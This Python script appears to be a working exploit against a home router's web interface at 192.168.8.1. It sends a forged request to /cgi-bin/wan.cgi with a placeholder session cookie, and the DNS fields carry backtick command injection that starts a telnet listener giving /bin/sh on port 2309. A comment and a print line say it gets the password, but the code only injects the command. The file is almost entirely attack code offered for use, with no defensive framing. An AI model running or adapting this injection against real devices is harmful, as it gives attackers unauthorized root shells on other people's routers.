#!/usr/bin/env python3
# pylint: disable=C0103
#coding=utf-8
# pip3 install requests lxml
#
import hmac
import json
import sys
from urllib.parse import urljoin
from xml.sax.saxutils import escape
import lxml.etree
import requests



"""
Host: 192.168.8.1
Content-Length: 194
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.8.1
Referer: http://192.168.8.1/wan.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

"""


session = requests.Session()
session.verify = False

############################################################获取用户名密码

print("Get password...")

headers = {"Accept":"text/plain, */*; q=0.01","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Origin":"http://192.168.8.1","Referer":"http://192.168.8.1/wan.html","Accept-Encoding":"http://192.168.8.1/wan.html","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9","Connection":"close"}

cookies = {"uid": "whatever"}
data={"task_id":"3.2","proto":"3","ipaddr":"192.168.8.1","netmask":"255.255.255.0","gateway":"192.168.8.254","dns1":"2.2.2.2`telnetd -l /bin/sh -p 2309`","dns2":"2.2.2.3`telnetd -l /bin/sh -p 2309`"}

resp = session.post("http://192.168.8.1/cgi-bin/wan.cgi", cookies=cookies,data=json.dumps(data),headers=headers)
# print(resp.text)